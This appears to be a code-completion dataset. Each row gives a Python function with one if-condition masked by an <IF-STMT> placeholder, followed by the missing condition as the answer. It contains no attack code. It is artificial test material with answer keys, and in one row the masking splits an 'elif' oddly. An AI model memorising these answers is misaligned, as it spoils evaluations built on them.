60,"def __call__(self, es, params):<tab>ops = 0<tab>indices = mandatory(params, ""indices"", self)<tab>only_if_exists = params.get(""only-if-exists"", False)<tab>request_params = params.get(""request-params"", {})<tab>for index_name in indices:<tab><tab>if not only_if_exists:<tab><tab><tab>es.indices.delete(index=index_name, params=request_params)<tab><tab><tab>ops += 1<tab><tab><IF-STMT><tab><tab><tab>self.logger.info(""Index [%s] already exists. Deleting it."", index_name)<tab><tab><tab>es.indices.delete(index=index_name, params=request_params)<tab><tab><tab>ops += 1<tab>return ops, ""ops""",elif only_if_exists and es . indices . exists ( index = index_name ) :,198
61,"def get():<tab>result = []<tab>for b in self.key_bindings:<tab><tab><IF-STMT><tab><tab><tab>match = True<tab><tab><tab>for i, j in zip(b.keys, keys):<tab><tab><tab><tab>if i != j and i != Keys.Any:<tab><tab><tab><tab><tab>match = False<tab><tab><tab><tab><tab>break<tab><tab><tab>if match:<tab><tab><tab><tab>result.append(b)<tab>return result",if len ( keys ) < len ( b . keys ) :,113
62,"def get_arg_list_scalar_arg_dtypes(arg_types):<tab>result = []<tab>for arg_type in arg_types:<tab><tab><IF-STMT><tab><tab><tab>result.append(arg_type.dtype)<tab><tab>elif isinstance(arg_type, VectorArg):<tab><tab><tab>result.append(None)<tab><tab><tab>if arg_type.with_offset:<tab><tab><tab><tab>result.append(np.int64)<tab><tab>else:<tab><tab><tab>raise RuntimeError(""arg type not understood: %s"" % type(arg_type))<tab>return result","if isinstance ( arg_type , ScalarArg ) :",142
63,"def autocommitter():<tab>while True:<tab><tab>try:<tab><tab><tab>if not self._running:<tab><tab><tab><tab>break<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._auto_commit()<tab><tab><tab>self._cluster.handler.sleep(self._auto_commit_interval_ms / 1000)<tab><tab>except ReferenceError:<tab><tab><tab>break<tab><tab>except Exception:<tab><tab><tab># surface all exceptions to the main thread<tab><tab><tab>self._worker_exception = sys.exc_info()<tab><tab><tab>break<tab>log.debug(""Autocommitter thread exiting"")",if self . _auto_commit_enable :,141
64,"def on_conflict(self, *target_fields: Union[str, Term]) -> ""PostgreSQLQueryBuilder"":<tab>if not self._insert_table:<tab><tab>raise QueryException(""On conflict only applies to insert query"")<tab>self._on_conflict = True<tab>for target_field in target_fields:<tab><tab><IF-STMT><tab><tab><tab>self._on_conflict_fields.append(self._conflict_field_str(target_field))<tab><tab>elif isinstance(target_field, Term):<tab><tab><tab>self._on_conflict_fields.append(target_field)","if isinstance ( target_field , str ) :",141
65,"def change_TV_DOWNLOAD_DIR(tv_download_dir):<tab>if tv_download_dir == """":<tab><tab>sickbeard.TV_DOWNLOAD_DIR = """"<tab><tab>return True<tab>if os.path.normpath(sickbeard.TV_DOWNLOAD_DIR) != os.path.normpath(tv_download_dir):<tab><tab><IF-STMT><tab><tab><tab>sickbeard.TV_DOWNLOAD_DIR = os.path.normpath(tv_download_dir)<tab><tab><tab>logger.log(u""Changed TV download folder to "" + tv_download_dir)<tab><tab>else:<tab><tab><tab>return False<tab>return True",if helpers . makeDir ( tv_download_dir ) :,157
66,"def save_config(self, cmd=""save config"", confirm=True, confirm_response=""y""):<tab>""""""Saves Config.""""""<tab>self.enable()<tab>if confirm:<tab><tab>output = self.send_command_timing(command_string=cmd)<tab><tab><IF-STMT><tab><tab><tab>output += self.send_command_timing(confirm_response)<tab><tab>else:<tab><tab><tab># Send enter by default<tab><tab><tab>output += self.send_command_timing(self.RETURN)<tab>else:<tab><tab># Some devices are slow so match on trailing-prompt if you can<tab><tab>output = self.send_command(command_string=cmd)<tab>return output",if confirm_response :,159
67,"def apply_gradient_for_batch(inputs, labels, weights, loss):<tab>with tf.GradientTape() as tape:<tab><tab>outputs = self.model(inputs, training=True)<tab><tab><IF-STMT><tab><tab><tab>outputs = [outputs]<tab><tab>if self._loss_outputs is not None:<tab><tab><tab>outputs = [outputs[i] for i in self._loss_outputs]<tab><tab>batch_loss = loss(outputs, labels, weights)<tab>if variables is None:<tab><tab>vars = self.model.trainable_variables<tab>else:<tab><tab>vars = variables<tab>grads = tape.gradient(batch_loss, vars)<tab>self._tf_optimizer.apply_gradients(zip(grads, vars))<tab>self._global_step.assign_add(1)<tab>return batch_loss","if isinstance ( outputs , tf . Tensor ) :",193
68,"def sort(self, items):<tab>slow_sorts = []<tab>switch_slow = False<tab>for sort in reversed(self.sorts):<tab><tab><IF-STMT><tab><tab><tab>slow_sorts.append(sort)<tab><tab>elif sort.order_clause() is None:<tab><tab><tab>switch_slow = True<tab><tab><tab>slow_sorts.append(sort)<tab><tab>else:<tab><tab><tab>pass<tab>for sort in slow_sorts:<tab><tab>items = sort.sort(items)<tab>return items",if switch_slow :,121
69,"def getmod(self, nm):<tab>mod = None<tab>for thing in self.path:<tab><tab>if isinstance(thing, basestring):<tab><tab><tab>owner = self.shadowpath.get(thing, -1)<tab><tab><tab>if owner == -1:<tab><tab><tab><tab>owner = self.shadowpath[thing] = self.__makeOwner(thing)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>mod = owner.getmod(nm)<tab><tab>else:<tab><tab><tab>mod = thing.getmod(nm)<tab><tab>if mod:<tab><tab><tab>break<tab>return mod",if owner :,137
70,"def has(self, key):<tab>filename = self._get_filename(key)<tab>try:<tab><tab>with open(filename, ""rb"") as f:<tab><tab><tab>pickle_time = pickle.load(f)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab><tab><tab>else:<tab><tab><tab><tab>os.remove(filename)<tab><tab><tab><tab>return False<tab>except (IOError, OSError, pickle.PickleError):<tab><tab>return False",if pickle_time == 0 or pickle_time >= time ( ) :,117
71,"def forward(self, hs):<tab>h = self.c0(hs[-1])<tab>for i in range(1, 8):<tab><tab>h = F.concat([h, hs[-i - 1]])<tab><tab><IF-STMT><tab><tab><tab>h = self[""c%d"" % i](h)<tab><tab>else:<tab><tab><tab>h = self.c7(h)<tab>return h",if i < 7 :,96
72,"def get_custom_behaviour2(self):<tab>string = """"<tab>for arg in list(self.defaults.keys()) + self.var:<tab><tab><IF-STMT><tab><tab><tab># Don't add redundant lines e.g. sus=sus;<tab><tab><tab>if str(arg) != str(self.__dict__[arg]):<tab><tab><tab><tab>string += str(arg) + ""="" + str(self.__dict__[arg]) + "";\n""<tab>return string",if arg in self . __dict__ :,112
73,"def _apply_operation(self, values):<tab>""""""Method that defines the less-than-or-equal operation""""""<tab>arg1 = next(values)<tab>for strict in self._strict:<tab><tab>arg2 = next(values)<tab><tab>if strict:<tab><tab><tab>if not (arg1 < arg2):<tab><tab><tab><tab>return False<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab>arg1 = arg2<tab>return True",if not ( arg1 <= arg2 ) :,118
74,"def i_pshufb(self, op, off=0):<tab>dst = self.getOperValue(op, off)<tab>src = self.getOperValue(op, off)<tab>res = 0<tab>if op.opers[0].tsize == 8:<tab><tab>mask = 0x07<tab>else:<tab><tab>mask = 0x0F<tab>for i in range(op.opers[0].tsize):<tab><tab>shfl = src & (1 << ((i * 8) + 7))<tab><tab><IF-STMT><tab><tab><tab>s = 0<tab><tab>else:<tab><tab><tab>indx = (src >> (i * 8)) & mask<tab><tab><tab>s = (src >> (indx * 8)) & 0xFF<tab><tab>res |= s << (i * 8)<tab>self.setOperValue(op, 0, res)",if shfl :,199
75,"def report_out_of_quota(self, appid):<tab>self.logger.warn(""report_out_of_quota:%s"", appid)<tab>with self.lock:<tab><tab><IF-STMT><tab><tab><tab>self.out_of_quota_appids.append(appid)<tab><tab>try:<tab><tab><tab>self.working_appid_list.remove(appid)<tab><tab>except:<tab><tab><tab>pass",if appid not in self . out_of_quota_appids :,115
76,"def to_py(self, value: _StrUnset) -> _StrUnsetNone:<tab>self._basic_py_validation(value, str)<tab>if isinstance(value, usertypes.Unset):<tab><tab>return value<tab>elif not value:<tab><tab>return None<tab>value = os.path.expandvars(value)<tab>value = os.path.expanduser(value)<tab>try:<tab><tab><IF-STMT><tab><tab><tab>raise configexc.ValidationError(value, ""must be a valid directory!"")<tab><tab>if not os.path.isabs(value):<tab><tab><tab>raise configexc.ValidationError(value, ""must be an absolute path!"")<tab>except UnicodeEncodeError as e:<tab><tab>raise configexc.ValidationError(value, e)<tab>return value",if not os . path . isdir ( value ) :,181
77,"def findinDoc(self, tagpath, pos, end):<tab>result = None<tab>if end == -1:<tab><tab>end = self.docSize<tab>else:<tab><tab>end = min(self.docSize, end)<tab>foundat = -1<tab>for j in range(pos, end):<tab><tab>item = self.docList[j]<tab><tab>if item.find(b""="") >= 0:<tab><tab><tab>(name, argres) = item.split(b""="", 1)<tab><tab>else:<tab><tab><tab>name = item<tab><tab><tab>argres = """"<tab><tab><IF-STMT><tab><tab><tab>tagpath = tagpath.encode(""utf-8"")<tab><tab>if name.endswith(tagpath):<tab><tab><tab>result = argres<tab><tab><tab>foundat = j<tab><tab><tab>break<tab>return foundat, result","if isinstance ( tagpath , str ) :",189
78,"def has_safe_repr(value):<tab>""""""Does the node have a safe representation?""""""<tab>if value is None or value is NotImplemented or value is Ellipsis:<tab><tab>return True<tab>if isinstance(value, (bool, int, long, float, complex, basestring, xrange, Markup)):<tab><tab>return True<tab>if isinstance(value, (tuple, list, set, frozenset)):<tab><tab>for item in value:<tab><tab><tab>if not has_safe_repr(item):<tab><tab><tab><tab>return False<tab><tab>return True<tab>elif isinstance(value, dict):<tab><tab>for key, value in value.iteritems():<tab><tab><tab>if not has_safe_repr(key):<tab><tab><tab><tab>return False<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab>return True<tab>return False",if not has_safe_repr ( value ) :,192
79,"def run(self):<tab># Make some objects emit lights<tab>for obj in bpy.context.scene.objects:<tab><tab><IF-STMT><tab><tab><tab>obj_id = obj[""modelId""]<tab><tab><tab># In the case of the lamp<tab><tab><tab>if obj_id in self.lights:<tab><tab><tab><tab>self._make_lamp_emissive(obj, self.lights[obj_id])<tab><tab><tab># Make the windows emit light<tab><tab><tab>if obj_id in self.windows:<tab><tab><tab><tab>self._make_window_emissive(obj)<tab><tab><tab># Also make ceilings slightly emit light<tab><tab><tab>if obj.name.startswith(""Ceiling#""):<tab><tab><tab><tab>self._make_ceiling_emissive(obj)","if ""modelId"" in obj :",190
80,"def bitvector_case_fn(<tab>rng: Random, mode: RandomizationMode, size: int, invalid_making_pos: int = None):<tab>bits = get_random_ssz_object(<tab><tab>rng,<tab><tab>Bitvector[size],<tab><tab>max_bytes_length=(size + 7) // 8,<tab><tab>max_list_length=size,<tab><tab>mode=mode,<tab><tab>chaos=False,<tab>)<tab>if invalid_making_pos is not None and invalid_making_pos <= size:<tab><tab>already_invalid = False<tab><tab>for i in range(invalid_making_pos, size):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>already_invalid = True<tab><tab>if not already_invalid:<tab><tab><tab>bits[invalid_making_pos] = True<tab>return bits",if bits [ i ] :,196
81,"def get_transaction_execution_results(self, batch_signature):<tab>with self._condition:<tab><tab>batch_status = self._batch_statuses.get(batch_signature)<tab><tab>if batch_status is None:<tab><tab><tab>return None<tab><tab>annotated_batch = self._batch_by_id.get(batch_signature)<tab><tab>if annotated_batch is None:<tab><tab><tab>return None<tab><tab>results = []<tab><tab>for txn in annotated_batch.batch.transactions:<tab><tab><tab>result = self._txn_results.get(txn.header_signature)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>results.append(result)<tab><tab>return results",if result is not None :,161
82,"def one_xmm_reg_imm8(ii):  # also allows SSE4 2-imm8 instr<tab>i, j, n = 0, 0, 0<tab>for op in _gen_opnds(ii):<tab><tab>if op_reg(op) and op_xmm(op):<tab><tab><tab>n += 1<tab><tab>elif op_imm8(op):<tab><tab><tab>i += 1<tab><tab><IF-STMT><tab><tab><tab>j += 1<tab><tab>else:<tab><tab><tab>return False<tab>return n == 1 and i == 1 and j <= 1",elif op_imm8_2 ( op ) :,141
83,"def whichmodule(obj, name):<tab>""""""Find the module an object belong to.""""""<tab>module_name = getattr(obj, ""__module__"", None)<tab>if module_name is not None:<tab><tab>return module_name<tab># Protect the iteration by using a list copy of sys.modules against dynamic<tab># modules that trigger imports of other modules upon calls to getattr.<tab>for module_name, module in sys.modules.copy().items():<tab><tab>if module_name == ""__main__"" or module is None:<tab><tab><tab>continue<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return module_name<tab><tab>except AttributeError:<tab><tab><tab>pass<tab>return ""__main__""","if _getattribute ( module , name ) [ 0 ] is obj :",171
84,"def get_ld_header_info(p):<tab># ""nested-function, but placed at module level<tab># as an ld_header was found, return known paths, archives and members<tab># these lines start with a digit<tab>info = []<tab>for line in p.stdout:<tab><tab><IF-STMT><tab><tab><tab>info.append(line)<tab><tab>else:<tab><tab><tab># blank line (separator), consume line and end for loop<tab><tab><tab>break<tab>return info","if re . match ( ""[0-9]"" , line ) :",120
85,"def write(self, s):<tab>if self.closed:<tab><tab>raise ValueError(""write to closed file"")<tab>if type(s) not in (unicode, str, bytearray):<tab><tab># See issue #19481<tab><tab><IF-STMT><tab><tab><tab>s = unicode.__getitem__(s, slice(None))<tab><tab>elif isinstance(s, str):<tab><tab><tab>s = str.__str__(s)<tab><tab>elif isinstance(s, bytearray):<tab><tab><tab>s = bytearray.__str__(s)<tab><tab>else:<tab><tab><tab>raise TypeError(""must be string, not "" + type(s).__name__)<tab>return self.shell.write(s, self.tags)","if isinstance ( s , unicode ) :",161
86,"def generate_forwards(cls, attrs):<tab># forward functions of _forwards<tab>for attr_name, attr in cls._forwards.__dict__.items():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if isinstance(attr, property):<tab><tab><tab>cls._forward.append(attr_name)<tab><tab>elif isinstance(attr, types.FunctionType):<tab><tab><tab>wrapper = _forward_factory(cls, attr_name, attr)<tab><tab><tab>setattr(cls, attr_name, wrapper)<tab><tab>else:<tab><tab><tab>raise TypeError(attr_name, type(attr))","if attr_name . startswith ( ""_"" ) or attr_name in attrs :",146
87,"def _user_has_dnd(bot, user_id):<tab>try:<tab><tab>return bot.call_shared(""dnd.user_check"", user_id)  # shared dnd check<tab>except KeyError:<tab><tab>logger.warning(""mentions: falling back to legacy _user_has_dnd()"")<tab><tab>initiator_has_dnd = False<tab><tab><IF-STMT><tab><tab><tab>donotdisturb = bot.memory.get(""donotdisturb"")<tab><tab><tab>if user_id in donotdisturb:<tab><tab><tab><tab>initiator_has_dnd = True<tab><tab>return initiator_has_dnd","if bot . memory . exists ( [ ""donotdisturb"" ] ) :",162
88,"def init(self):<tab>""""""Initialize a fighter from the database and validate""""""<tab>self.__item = None<tab>if self.itemID:<tab><tab>self.__item = eos.db.getItem(self.itemID)<tab><tab><IF-STMT><tab><tab><tab>pyfalog.error(""Item (id: {0}) does not exist"", self.itemID)<tab><tab><tab>return<tab>if self.isInvalid:<tab><tab>pyfalog.error(""Item (id: {0}) is not a Fighter"", self.itemID)<tab><tab>return<tab>self.build()",if self . __item is None :,141
89,"def _pg_sku_name_validator(sku_name, sku_info, tier):<tab>if sku_name:<tab><tab>skus = get_postgres_skus(sku_info, tier)<tab><tab><IF-STMT><tab><tab><tab>error_msg = (<tab><tab><tab><tab>""Incorrect value for --sku-name. ""<tab><tab><tab><tab>+ ""The SKU name does not match {} tier. Specify --tier if you did not. "".format(<tab><tab><tab><tab><tab>tier<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab><tab>raise CLIError(error_msg + ""Allowed values : {}"".format(skus))",if sku_name not in skus :,156
90,"def _parse_paternity_log(writer, file):<tab>parent_map = {}<tab>parent_map[0] = 0<tab>for line in file.read().decode(""utf-8"").split(""\n""):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>elems = line.split("" "")  # <Child> <Parent><tab><tab>if len(elems) >= 2:<tab><tab><tab>#<tab><tab><tab><tab><tab>   print ""paternity of %d is %d"" % (int(elems[0]), int(elems[1]))<tab><tab><tab>parent_map[int(elems[0])] = int(elems[1])<tab><tab>else:<tab><tab><tab>print(""Odd paternity line '%s'"" % (line))<tab>return parent_map",if not line :,196
91,def _get_next_cap(self):<tab># type: () -> bool<tab>self._curr_cap = None<tab>if self._curr_cap_idx is None:<tab><tab>self._curr_cap_idx = 0<tab><tab>self._curr_cap = self._cap_list[0]<tab><tab>return True<tab>else:<tab><tab><IF-STMT><tab><tab><tab>self._end_of_video = True<tab><tab><tab>return False<tab><tab>self._curr_cap_idx += 1<tab><tab>self._curr_cap = self._cap_list[self._curr_cap_idx]<tab><tab>return True,if not ( self . _curr_cap_idx + 1 ) < len ( self . _cap_list ) :,163
92,"def decode_payload(args):<tab>try:<tab><tab>if args.token:<tab><tab><tab>token = args.token<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>token = sys.stdin.readline().strip()<tab><tab><tab>else:<tab><tab><tab><tab>raise IOError(""Cannot read from stdin: terminal not a TTY"")<tab><tab>token = token.encode(""utf-8"")<tab><tab>data = decode(token, key=args.key, verify=args.verify)<tab><tab>return json.dumps(data)<tab>except DecodeError as e:<tab><tab>raise DecodeError(""There was an error decoding the token: %s"" % e)",if sys . stdin . isatty ( ) :,156
93,"def cell_double_clicked(self, row, column):<tab>if column == 3:<tab><tab>archive_name = self.selected_archive_name()<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>mount_point = self.mount_points.get(archive_name)<tab><tab>if mount_point is not None:<tab><tab><tab>QDesktopServices.openUrl(QtCore.QUrl(f""file:///{mount_point}""))",if not archive_name :,107
94,"def tiles_around(self, pos, radius=1, predicate=None):<tab>ps = []<tab>x, y = pos<tab>for dx in range(-radius, radius + 1):<tab><tab>nx = x + dx<tab><tab><IF-STMT><tab><tab><tab>for dy in range(-radius, radius + 1):<tab><tab><tab><tab>ny = y + dy<tab><tab><tab><tab>if ny >= 0 and ny < self.height and (dx != 0 or dy != 0):<tab><tab><tab><tab><tab>if predicate is None or predicate((nx, ny)):<tab><tab><tab><tab><tab><tab>ps.append((nx, ny))<tab>return ps",if nx >= 0 and nx < self . width :,151
95,"def __init__(self, type, data, name=None):<tab>Constant.__init__(self, type, data, name)<tab>self.tag.unique_value = None<tab>if isinstance(data, np.ndarray) and data.ndim > 0:<tab><tab>flat_data = data.ravel()<tab><tab>if flat_data.shape[0]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.tag.unique_value = flat_data[0]",if ( flat_data == flat_data [ 0 ] ) . all ( ) :,118
96,"def git_convert_standalone_clone(repodir):<tab>""""""If specified directory is a git repository, ensure it's a standalone clone""""""<tab>import bb.process<tab>if os.path.exists(os.path.join(repodir, "".git"")):<tab><tab>alternatesfile = os.path.join(repodir, "".git"", ""objects"", ""info"", ""alternates"")<tab><tab><IF-STMT><tab><tab><tab># This will have been cloned with -s, so we need to convert it so none<tab><tab><tab># of the contents is shared<tab><tab><tab>bb.process.run(""git repack -a"", cwd=repodir)<tab><tab><tab>os.remove(alternatesfile)",if os . path . exists ( alternatesfile ) :,166
97,"def _rename_recipe_file(oldrecipe, bpn, oldpv, newpv, path):<tab>oldrecipe = os.path.basename(oldrecipe)<tab>if oldrecipe.endswith(""_%s.bb"" % oldpv):<tab><tab>newrecipe = ""%s_%s.bb"" % (bpn, newpv)<tab><tab><IF-STMT><tab><tab><tab>shutil.move(os.path.join(path, oldrecipe), os.path.join(path, newrecipe))<tab>else:<tab><tab>newrecipe = oldrecipe<tab>return os.path.join(path, newrecipe)",if oldrecipe != newrecipe :,154
98,"def profiling_startup():<tab>if ""--profile-sverchok-startup"" in sys.argv:<tab><tab>global _profile_nesting<tab><tab>profile = None<tab><tab>try:<tab><tab><tab>profile = get_global_profile()<tab><tab><tab>_profile_nesting += 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>profile.enable()<tab><tab><tab>yield profile<tab><tab>finally:<tab><tab><tab>_profile_nesting -= 1<tab><tab><tab>if _profile_nesting == 0 and profile is not None:<tab><tab><tab><tab>profile.disable()<tab><tab><tab>dump_stats(file_path=""sverchok_profile.txt"")<tab><tab><tab>save_stats(""sverchok_profile.prof"")<tab>else:<tab><tab>yield None",if _profile_nesting == 1 :,180
99,"def to_scaled_dtype(val):<tab>""""""Parse *val* to return a dtype.""""""<tab>res = []<tab>for i in val:<tab><tab><IF-STMT><tab><tab><tab>res.append((i[0], i[1]) + i[2:-1])<tab><tab>else:<tab><tab><tab>try:<tab><tab><tab><tab>res.append((i[0], i[-1].dtype) + i[2:-1])<tab><tab><tab>except AttributeError:<tab><tab><tab><tab>res.append((i[0], type(i[-1])) + i[2:-1])<tab>return np.dtype(res)","if i [ 1 ] . startswith ( ""S"" ) :",148
100,"def row(self, indx):<tab>if indx not in self.__rows:<tab><tab>if indx in self.__flushed_rows:<tab><tab><tab>raise Exception(<tab><tab><tab><tab>""Attempt to reuse row index %d of sheet %r after flushing""<tab><tab><tab><tab>% (indx, self.__name)<tab><tab><tab>)<tab><tab>self.__rows[indx] = self.Row(indx, self)<tab><tab><IF-STMT><tab><tab><tab>self.last_used_row = indx<tab><tab>if indx < self.first_used_row:<tab><tab><tab>self.first_used_row = indx<tab>return self.__rows[indx]",if indx > self . last_used_row :,157
101,"def _flow_open(self):<tab>rv = []<tab>for pipe in self.pipes:<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab>f""{pipe.__class__.__name__} pipe has double open methods.""<tab><tab><tab><tab>f"" Use `open` or `{self._method_open}`, not both.""<tab><tab><tab>)<tab><tab>if ""open"" in pipe._pipeline_all_methods_:<tab><tab><tab>rv.append(pipe.open)<tab><tab>if self._method_open in pipe._pipeline_all_methods_:<tab><tab><tab>rv.append(getattr(pipe, self._method_open))<tab>return rv","if pipe . _pipeline_all_methods_ . issuperset ( { ""open"" , self . _method_open } ) :",167
102,"def _parse_output(output, strict=False):<tab>for pkg in _yum_pkginfo(output):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>repo_dict = ret.setdefault(pkg.repoid, {})<tab><tab>version_list = repo_dict.setdefault(pkg.name, set())<tab><tab>version_list.add(pkg.version)","if strict and ( pkg . repoid not in repos or not _check_args ( args , pkg . name ) ) :",108
103,"def user_defined_os():<tab>if menu.options.os:<tab><tab>if menu.options.os.lower() == ""windows"":<tab><tab><tab>settings.TARGET_OS = ""win""<tab><tab><tab>return True<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>else:<tab><tab><tab>err_msg = ""You specified wrong value '"" + menu.options.os + ""' ""<tab><tab><tab>err_msg += ""as an operation system. The value, must be 'Windows' or 'Unix'.""<tab><tab><tab>print(settings.print_critical_msg(err_msg))<tab><tab><tab>raise SystemExit()","elif menu . options . os . lower ( ) == ""unix"" :",153
104,"def update(self, topLeft, bottomRight):<tab>if self._updating:<tab><tab># We are currently putting data in the model, so no updates<tab><tab>return<tab>if self._index:<tab><tab>if topLeft.row() <= self._index.row() <= bottomRight.row():<tab><tab><tab>self.updateText()<tab>elif self._indexes:<tab><tab>update = False<tab><tab>for i in self._indexes:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>update = True<tab><tab>if update:<tab><tab><tab>self.updateText()",if topLeft . row ( ) <= i . row ( ) <= bottomRight . row ( ) :,144
105,"def _wrapper(self, pipe, _should_terminate_flag, generator, *args, **kwargs):<tab>""""""Executed in background, pipes generator results to foreground""""""<tab>logger.debug(""Entering _wrapper"")<tab>try:<tab><tab>for datum in generator(*args, **kwargs):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise EarlyCancellationError(""Task was cancelled"")<tab><tab><tab>pipe.send(datum)<tab>except Exception as e:<tab><tab>if not isinstance(e, EarlyCancellationError):<tab><tab><tab>pipe.send(e)<tab><tab><tab>import traceback<tab><tab><tab>logger.warning(traceback.format_exc())<tab>else:<tab><tab>pipe.send(StopIteration())<tab>finally:<tab><tab>pipe.close()<tab><tab>logger.debug(""Exiting _wrapper"")",if _should_terminate_flag . value :,192
106,"def _flatten(*args):<tab>arglist = []<tab>for arg in args:<tab><tab>if isinstance(arg, _Block):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>arglist.append(arg.vhdl_code)<tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>arg = arg.subs<tab><tab>if id(arg) in _userCodeMap[""vhdl""]:<tab><tab><tab>arglist.append(_userCodeMap[""vhdl""][id(arg)])<tab><tab>elif isinstance(arg, (list, tuple, set)):<tab><tab><tab>for item in arg:<tab><tab><tab><tab>arglist.extend(_flatten(item))<tab><tab>else:<tab><tab><tab>arglist.append(arg)<tab>return arglist",if arg . vhdl_code is not None :,179
107,"def _get_target_and_lun(self, context, volume):<tab>iscsi_target = 0<tab>if not self.target_name or not self._get_group():<tab><tab>lun = 1<tab><tab>return iscsi_target, lun<tab>luns = self._get_luns_info()<tab>if (not luns) or (luns[0] != 1):<tab><tab>lun = 1<tab><tab>return iscsi_target, lun<tab>else:<tab><tab>for lun in luns:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return iscsi_target, (lun + 1)",if ( luns [ - 1 ] == lun ) or ( luns [ lun - 1 ] + 1 != luns [ lun ] ) :,188
108,"def check_find(ref):<tab># Check find returns indexes for single point codes<tab>for c in set(m.used):<tab><tab>start = 0<tab><tab>u = m.text<tab><tab>while start < m.size:<tab><tab><tab>i = u.find(c, start)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>self.assertEqual(u[i], c)<tab><tab><tab>self.assertGreaterEqual(i, start)<tab><tab><tab>start = i + 1",if i < 0 :,118
109,"def _format_column_list(self, data):<tab># Now we have all lis of columns which we need<tab># to include in our create definition, Let's format them<tab>if ""columns"" in data:<tab><tab>for c in data[""columns""]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>c[""attacl""] = parse_priv_to_db(c[""attacl""], self.column_acl)<tab><tab><tab># check type for '[]' in it<tab><tab><tab>if ""cltype"" in c:<tab><tab><tab><tab>c[""cltype""], c[""hasSqrBracket""] = column_utils.type_formatter(<tab><tab><tab><tab><tab>c[""cltype""]<tab><tab><tab><tab>)","if ""attacl"" in c :",170
110,"def _animate_strategy(self, speed=1):<tab>if self._animating == 0:<tab><tab>return<tab>if self._apply_strategy() is not None:<tab><tab>if self._animate.get() == 0 or self._step.get() == 1:<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab>self._root.after(3000, self._animate_strategy)<tab><tab>elif self._animate.get() == 2:<tab><tab><tab>self._root.after(1000, self._animate_strategy)<tab><tab>else:<tab><tab><tab>self._root.after(20, self._animate_strategy)",if self . _animate . get ( ) == 1 :,151
111,"def close_all(map=None, ignore_all=False):<tab>if map is None:  # pragma: no cover<tab><tab>map = socket_map<tab>for x in list(map.values()):  # list() FBO py3<tab><tab>try:<tab><tab><tab>x.close()<tab><tab>except OSError as x:<tab><tab><tab>if x.args[0] == EBADF:<tab><tab><tab><tab>pass<tab><tab><tab>el<IF-STMT><tab><tab><tab><tab>raise<tab><tab>except _reraised_exceptions:<tab><tab><tab>raise<tab><tab>except:<tab><tab><tab>if not ignore_all:<tab><tab><tab><tab>raise<tab>map.clear()",if not ignore_all :,157
112,"def iter_imports(path):<tab>""""""Yield imports in *path*""""""<tab>for node in ast.parse(open(path, ""rb"").read()).body:<tab><tab>if isinstance(node, ast.ImportFrom):<tab><tab><tab>if node.module is None:<tab><tab><tab><tab>prefix = ()<tab><tab><tab>else:<tab><tab><tab><tab>prefix = tuple(node.module.split("".""))<tab><tab><tab>for snode in node.names:<tab><tab><tab><tab>yield (node.level, prefix + (snode.name,))<tab><tab><IF-STMT><tab><tab><tab>for node in node.names:<tab><tab><tab><tab>yield (0, tuple(node.name.split(""."")))","elif isinstance ( node , ast . Import ) :",162
113,"def one_stage_eval_model(data_reader_eval, myModel, loss_criterion=None):<tab>score_tot = 0<tab>n_sample_tot = 0<tab>loss_tot = 0<tab>for idx, batch in enumerate(data_reader_eval):<tab><tab>score, loss, n_sample = compute_a_batch(<tab><tab><tab>batch, myModel, eval_mode=True, loss_criterion=loss_criterion<tab><tab>)<tab><tab>score_tot += score<tab><tab>n_sample_tot += n_sample<tab><tab><IF-STMT><tab><tab><tab>loss_tot += loss.data[0] * n_sample<tab>return score_tot / n_sample_tot, loss_tot / n_sample_tot, n_sample_tot",if loss is not None :,181
114,"def _process_preproc(self, token, content):<tab>if self.state == ""include"":<tab><tab><IF-STMT><tab><tab><tab>content = content.strip().strip('""').strip(""<"").strip("">"").strip()<tab><tab><tab>self.append(content, truncate=True, separator=""/"")<tab><tab>self.state = None<tab>elif content.strip().startswith(""include""):<tab><tab>self.state = ""include""<tab>else:<tab><tab>self.state = None","if content != ""\n"" and content != ""#"" :",115
115,"def _aggregate_metadata_attribute(<tab>self, attr, agg_func=np.max, default_value=0, from_type_metadata=True):<tab>attr_values = []<tab>for a in self.appliances:<tab><tab>if from_type_metadata:<tab><tab><tab>attr_value = a.type.get(attr)<tab><tab>else:<tab><tab><tab>attr_value = a.metadata.get(attr)<tab><tab><IF-STMT><tab><tab><tab>attr_values.append(attr_value)<tab>if len(attr_values) == 0:<tab><tab>return default_value<tab>else:<tab><tab>return agg_func(attr_values)",if attr_value is not None :,162
116,"def _remove(self, item):<tab>""""""Internal removal of an item""""""<tab># Manage siblings when items are deleted<tab>for sibling in self.lines[self.lines.index(item) + 1 :]:<tab><tab>if isinstance(sibling, CronItem):<tab><tab><tab>env = sibling.env<tab><tab><tab>sibling.env = item.env<tab><tab><tab>sibling.env.update(env)<tab><tab><tab>sibling.env.job = sibling<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>self.lines.remove(sibling)<tab><tab>else:<tab><tab><tab>break<tab>self.crons.remove(item)<tab>self.lines.remove(item)<tab>return 1","elif sibling == """" :",162
